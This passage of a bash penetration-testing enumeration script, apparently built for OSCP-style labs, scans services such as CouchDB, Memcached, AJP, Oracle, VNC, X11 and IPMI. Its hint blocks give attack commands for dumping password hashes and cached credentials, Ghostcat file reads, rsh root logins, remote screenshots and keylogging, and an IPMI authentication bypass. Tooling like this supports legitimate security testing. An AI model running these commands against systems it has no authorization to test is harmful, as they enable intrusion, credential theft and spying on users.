    echo "$CDB_ROOT" > "${CDB_DIR}/root.json"
    CDB_VER=$(echo "$CDB_ROOT" | grep -oE '"version"[[:space:]]*:[[:space:]]*"[0-9.]+"' | head -1 | grep -oE '[0-9.]+' || true)
    [[ -n "$CDB_VER" ]] && ok "CouchDB version: ${WHITE}${CDB_VER}${NC} (searchsploit couchdb ${CDB_VER})"

    for EP in "_all_dbs" "_membership" "_users/_all_docs?include_docs=true" "_config"; do
        SAFE=$(echo "$EP" | tr '/?=&' '____')
        cmd "curl -sk --max-time 10 http://${TARGET}:5984/${EP}"
        curl -sk --max-time 10 "http://${TARGET}:5984/${EP}" > "${CDB_DIR}/${SAFE}.json" 2>/dev/null || true
    done
    ok "CouchDB metadata saved → ${WHITE}${CDB_DIR}/${NC}"

    if grep -qi 'password\|derived_key\|salt' "${CDB_DIR}/_users__all_docs_include_docs_true.json" 2>/dev/null; then
        warn "${RED}⚠  CouchDB _users DB is readable — password hashes exposed!${NC}"
    fi
    hint "CouchDB manual review:
    # Fauxton web UI:
    curl -s http://${TARGET}:5984/_utils/
    # Dump a database's docs (read-only):
    curl -s http://${TARGET}:5984/<db>/_all_docs?include_docs=true
    # CVE-2017-12635 / CVE-2017-12636 (priv-esc + RCE on 1.x/2.x):
    searchsploit couchdb"
    echo ""
fi

# ===========================================================================
# Memcached — port 11211 (stats + key dump, read-only)
# ===========================================================================
if has_port 11211; then
    MC_DIR="${OUTPUT_DIR}/memcached"
    mkdir -p "$MC_DIR"
    info "[Memcached] enumeration on port 11211"

    MC_NMAP="${MC_DIR}/memcached_nmap.txt"
    cmd "nmap -p11211 --script memcached-info -Pn ${TARGET}"
    nmap -p11211 --script memcached-info --script-timeout 30s -Pn "$TARGET" -oN "$MC_NMAP" 2>&1 | tee "$MC_NMAP" || true

    # Raw stats over TCP (read-only)
    for MCMD in version stats "stats items" "stats slabs"; do
        SAFE=$(echo "$MCMD" | tr ' ' '_')
        cmd "printf '${MCMD}\\r\\n' | nc -w 3 ${TARGET} 11211"
        (printf '%s\r\n' "$MCMD" | timeout 5 nc -w 3 "$TARGET" 11211 > "${MC_DIR}/${SAFE}.txt" 2>&1) || true
    done
    ok "Memcached stats saved → ${WHITE}${MC_DIR}/${NC}"

    hint "Memcached manual — dump cached keys (may contain sessions / creds):
    # Find slab IDs from 'stats items', then dump keys per slab:
    printf 'stats items\\r\\n' | nc -w 3 ${TARGET} 11211
    printf 'stats cachedump <SLAB_ID> 0\\r\\n' | nc -w 3 ${TARGET} 11211
    printf 'get <KEY>\\r\\n' | nc -w 3 ${TARGET} 11211
    # Automated dumper:
    memcdump --servers=${TARGET}"
    echo ""
fi

# ===========================================================================
# AJP — port 8009 (Apache JServ Protocol / Tomcat connector)
# ===========================================================================
if has_port 8009; then
    AJP_DIR="${OUTPUT_DIR}/ajp"
    mkdir -p "$AJP_DIR"
    info "[AJP] Apache JServ Protocol enumeration on port 8009"

    AJP_NMAP="${AJP_DIR}/ajp_nmap.txt"
    cmd "nmap -p8009 --script ajp-methods,ajp-headers -Pn ${TARGET}"
    nmap -p8009 --script ajp-methods,ajp-headers --script-timeout 30s -Pn "$TARGET" -oN "$AJP_NMAP" 2>&1 | tee "$AJP_NMAP" || true
    ok "AJP nmap scan → ${WHITE}${AJP_NMAP}${NC}"

    warn "AJP present → check for Ghostcat (CVE-2020-1938) LFI/RCE on the fronting Tomcat."
    hint "AJP / Ghostcat (CVE-2020-1938) — manual (read a file via AJP LFI):
    # Confirm Tomcat version on 8080 first, then:
    python3 ghostcat.py -p 8009 -f WEB-INF/web.xml ${TARGET}
    msfconsole -q -x 'use auxiliary/admin/http/tomcat_ghostcat; set RHOSTS ${TARGET}; run'
    searchsploit ghostcat"
    echo ""
fi

# ===========================================================================
# Oracle TNS Listener — port 1521 (version + SID hints, read-only)
# ===========================================================================
if has_port 1521; then
    ORA_DIR="${OUTPUT_DIR}/oracle"
    mkdir -p "$ORA_DIR"
    info "[Oracle] TNS Listener enumeration on port 1521"

    ORA_NMAP="${ORA_DIR}/oracle_nmap.txt"
    cmd "nmap -p1521 --script oracle-tns-version -Pn ${TARGET}"
    nmap -p1521 --script oracle-tns-version --script-timeout 40s -Pn "$TARGET" -oN "$ORA_NMAP" 2>&1 | tee "$ORA_NMAP" || true
    ok "Oracle nmap scan → ${WHITE}${ORA_NMAP}${NC}"

    if command -v tnscmd10g &>/dev/null; then
        cmd "tnscmd10g version -h ${TARGET}"
        tnscmd10g version -h "$TARGET" > "${ORA_DIR}/tnscmd_version.txt" 2>&1 || true
        cmd "tnscmd10g status -h ${TARGET}"
        tnscmd10g status  -h "$TARGET" > "${ORA_DIR}/tnscmd_status.txt"  2>&1 || true
    fi
    hint "Oracle TNS manual — enumerate SIDs then attack (odat, read-only enum first):
    # SID brute (enumeration):
    nmap -p1521 --script oracle-sid-brute ${TARGET}
    odat sidguesser -s ${TARGET} -p 1521
    odat all -s ${TARGET} -p 1521
    # Once SID known, try default creds (scott/tiger, system/manager)."
    echo ""
fi

# ===========================================================================
# Erlang Port Mapper Daemon (epmd) — port 4369
# ===========================================================================
if has_port 4369; then
    EPMD_DIR="${OUTPUT_DIR}/epmd"
    mkdir -p "$EPMD_DIR"
    info "[epmd] Erlang Port Mapper enumeration on port 4369"

    EPMD_NMAP="${EPMD_DIR}/epmd_nmap.txt"
    cmd "nmap -p4369 --script epmd-info -Pn ${TARGET}"
    nmap -p4369 --script epmd-info --script-timeout 30s -Pn "$TARGET" -oN "$EPMD_NMAP" 2>&1 | tee "$EPMD_NMAP" || true
    ok "epmd nmap scan → ${WHITE}${EPMD_NMAP}${NC}"

    hint "epmd manual — lists Erlang nodes + their distribution ports:
    # Each node's dist port is another attack surface (RabbitMQ, CouchDB, etc).
    # If you find the Erlang cookie (often 'secret' or in ~/.erlang.cookie):
    #   CVE-2022-31108 style RCE via erldp with a known cookie.
    searchsploit erlang"
    echo ""
fi

# ===========================================================================
# VNC — ports 5900 / 5901 (info + auth check, read-only)
# ===========================================================================
if has_port 5900 || has_port 5901; then
    VNC_DIR="${OUTPUT_DIR}/vnc"
    mkdir -p "$VNC_DIR"
    for VP in 5900 5901; do
        has_port "$VP" || continue
        info "[VNC] enumeration on port ${VP}"
        VNC_NMAP="${VNC_DIR}/vnc_${VP}_nmap.txt"
        cmd "nmap -p${VP} --script vnc-info,realvnc-auth-bypass -Pn ${TARGET}"
        nmap -p"$VP" --script vnc-info,realvnc-auth-bypass --script-timeout 30s -Pn "$TARGET" -oN "$VNC_NMAP" 2>&1 | tee "$VNC_NMAP" || true
        if grep -qi 'none.*supported\|auth.*none\|No authentication' "$VNC_NMAP" 2>/dev/null; then
            warn "${RED}⚠  VNC ${VP}: authentication may be NONE — connect directly!${NC}"
        fi
    done
    hint "VNC manual:
    # Connect (no-auth or with a discovered password):
    vncviewer ${TARGET}:5900
    # Crack a captured VNC password (from config / registry):
    #   msfconsole → auxiliary/scanner/vnc/vnc_none_auth
    searchsploit vnc"
    echo ""
fi

# ===========================================================================
# Finger — port 79 (user enumeration, read-only)
# ===========================================================================
if has_port 79; then
    FIN_DIR="${OUTPUT_DIR}/finger"
    mkdir -p "$FIN_DIR"
    info "[Finger] user enumeration on port 79"

    cmd "nmap -p79 --script finger -Pn ${TARGET}"
    nmap -p79 --script finger --script-timeout 30s -Pn "$TARGET" -oN "${FIN_DIR}/finger_nmap.txt" 2>&1 | tee "${FIN_DIR}/finger_nmap.txt" || true

    if command -v finger &>/dev/null; then
        for U in "" root admin user guest; do
            cmd "finger ${U}@${TARGET}"
            finger "${U}@${TARGET}" >> "${FIN_DIR}/finger_users.txt" 2>&1 || true
        done
    fi
    ok "Finger output saved → ${WHITE}${FIN_DIR}/${NC}"
    hint "Finger manual — enumerate valid usernames:
    finger-user-enum.pl -U /usr/share/seclists/Usernames/Names/names.txt -t ${TARGET}"
    echo ""
fi

# ===========================================================================
# R-services — ports 512 (rexec) / 513 (rlogin) / 514 (rsh)
# ===========================================================================
if has_port 512 || has_port 513 || has_port 514; then
    info "[R-services] rexec/rlogin/rsh detected (512/513/514) — trust-based auth"
    warn "R-services rely on ~/.rhosts trust — no automated attack (OSCP-safe hint only)."
    hint "R-services manual (trust abuse — needs rsh-client: apt install rsh-client):
    # rlogin as root/known user (works if host trusts your IP / an empty .rhosts):
    rlogin -l root ${TARGET}
    rlogin -l <user> ${TARGET}
    # rsh command execution:
    rsh ${TARGET} -l root 'id'
    # rexec (513? no — 512):
    rexec -l <user> -p <pass> ${TARGET} id"
    echo ""
fi

# ===========================================================================
# X11 — port 6000 (open-access check, read-only)
# ===========================================================================
if has_port 6000; then
    X11_DIR="${OUTPUT_DIR}/x11"
    mkdir -p "$X11_DIR"
    info "[X11] access check on port 6000"

    cmd "nmap -p6000 --script x11-access -Pn ${TARGET}"
    nmap -p6000 --script x11-access --script-timeout 30s -Pn "$TARGET" -oN "${X11_DIR}/x11_nmap.txt" 2>&1 | tee "${X11_DIR}/x11_nmap.txt" || true
    if grep -qi 'X server access is granted\|is open' "${X11_DIR}/x11_nmap.txt" 2>/dev/null; then
        warn "${RED}⚠  X11 open access — you can capture the screen / keystrokes!${NC}"
    fi
    hint "X11 manual (if access granted — 'xhost +'):
    xdpyinfo -display ${TARGET}:0
    # Screenshot the remote desktop:
    xwd -root -display ${TARGET}:0 -out screen.xwd && convert screen.xwd screen.png
    # Keylog:
    xspy ${TARGET}:0"
    echo ""
fi

# ===========================================================================
# IPMI — port 623/UDP (version + cipher-zero check, read-only)
# ===========================================================================
if has_udp_port 623 || grep -qw "623/udp" "${OUTPUT_DIR}/scans/udp.txt" 2>/dev/null; then
    IPMI_DIR="${OUTPUT_DIR}/ipmi"
    mkdir -p "$IPMI_DIR"
    info "[IPMI] enumeration on port 623/UDP"

    IPMI_NMAP="${IPMI_DIR}/ipmi_nmap.txt"
    cmd "nmap -sU -p623 --script ipmi-version,ipmi-cipher-zero -Pn ${TARGET}"
    nmap -sU -p623 --script ipmi-version,ipmi-cipher-zero --script-timeout 40s -Pn "$TARGET" -oN "$IPMI_NMAP" 2>&1 | tee "$IPMI_NMAP" || true
    if grep -qi 'cipher.*zero.*enabled\|VULNERABLE' "$IPMI_NMAP" 2>/dev/null; then
        warn "${RED}⚠  IPMI Cipher Zero — authentication bypass possible!${NC}"
    fi
    hint "IPMI manual — dump BMC password hashes (CVE-2013-4786, always works on v2.0):
    msfconsole -q -x 'use auxiliary/scanner/ipmi/ipmi_dumphashes; set RHOSTS ${TARGET}; run'
    # Then crack with hashcat -m 7300, or Cipher Zero admin bypass:
    ipmitool -I lanplus -C 0 -H ${TARGET} -U admin -P '' user list"
    echo ""
fi

# ===========================================================================
# Banner grab — unknown / non-standard ports
# ===========================================================================
KNOWN_PORTS="21,22,23,25,53,69,79,80,88,110,111,135,139,143,389,443,445,512,513,514,636,993,995,1099,1433,1521,2049,3306,3389,4369,5432,5900,5901,5984,5985,5986,6000,6379,6667,6697,8000,8009,8080,8443,8888,9200,11211,27017"
UNKNOWN_PORTS=()

IFS=',' read -ra ALL_PORTS <<< "$PORTS"
for P in "${ALL_PORTS[@]}"; do
    if ! echo ",$KNOWN_PORTS," | grep -q ",$P,"; then
        UNKNOWN_PORTS+=("$P")
    fi
done

if [[ ${#UNKNOWN_PORTS[@]} -gt 0 ]]; then
    BANNER_DIR="${OUTPUT_DIR}/banners"
    mkdir -p "$BANNER_DIR"
    info "[BANNERS] Grabbing banners for non-standard ports: ${WHITE}${UNKNOWN_PORTS[*]}${NC}"

    for UP in "${UNKNOWN_PORTS[@]}"; do
        BANNER_OUT="${BANNER_DIR}/port_${UP}.txt"
        cmd "nc -nv -w 3 $TARGET $UP (banner grab)"
        BANNER=$(timeout 5 bash -c "echo '' | nc -nv -w 3 $TARGET $UP" 2>&1 || true)
        echo "$BANNER" > "$BANNER_OUT"

        if [[ -n "$BANNER" ]]; then
            BANNER_LINE=$(echo "$BANNER" | head -1 | cut -c1-80)
            ok "Port ${UP}: ${WHITE}${BANNER_LINE}${NC}"
        else
            info "Port ${UP}: no banner received."
        fi

        # Long-tail coverage: run nmap version detection + SAFE/default NSE
        # scripts on every rare port we don't have a dedicated block for.
        # -sC uses the "default" (safe) category — no brute/DoS/exploit — so
        # this stays OSCP-compliant while still fingerprinting oddball services.
        NMAP_OUT="${BANNER_DIR}/port_${UP}_nmap.txt"
        cmd "nmap -sV -sC -p${UP} --script-timeout 40s -Pn ${TARGET}"
        nmap -sV -sC -p"$UP" --script-timeout 40s -Pn "$TARGET" \
            -oN "$NMAP_OUT" 2>&1 | tail -n +1 > /dev/null || true
        SVC=$(grep -E "^${UP}/tcp" "$NMAP_OUT" 2>/dev/null | head -1 | sed 's/  */ /g' || true)
        [[ -n "$SVC" ]] && ok "Port ${UP} (nmap): ${WHITE}${SVC}${NC}"
    done

    hint "Rare-port next steps:
    # For any service identified above, look it up in the methodology:
    #   https://hacktricks.wiki/en/network-services-pentesting/
    # And check for known exploits:
    #   searchsploit <service> <version>"
    echo ""
fi

ok "Service enumeration complete — output: ${OUTPUT_DIR}/"
echo ""
